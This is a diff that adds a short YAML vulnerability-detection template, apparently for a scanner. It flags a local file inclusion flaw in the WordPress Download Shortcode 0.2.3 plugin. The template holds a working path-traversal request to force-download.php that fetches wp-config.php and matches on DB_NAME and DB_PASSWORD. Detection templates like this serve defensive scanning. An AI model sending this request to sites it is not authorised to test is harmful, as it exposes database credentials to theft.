@@ -1,0 +1,29 @@
+id: shortcode-lfi
+brief:
+    title: WordPress Download Shortcode 0.2.3 - Local File Inclusion
+    by: dhiyaneshDK
+    level: high
+    about: WordPress Download Shortcode 0.2.3 is prone to a local file inclusion vulnerability because it fails to sufficiently sanitize user-supplied input. Exploiting this issue may allow an attacker to obt...
+    label:
+        - lfi
+        - shortcode
+        - wp
+        - packetstorm
+        - wordpress
+        - wp-plugin
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/force-download.php?file=../wp-config.php'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
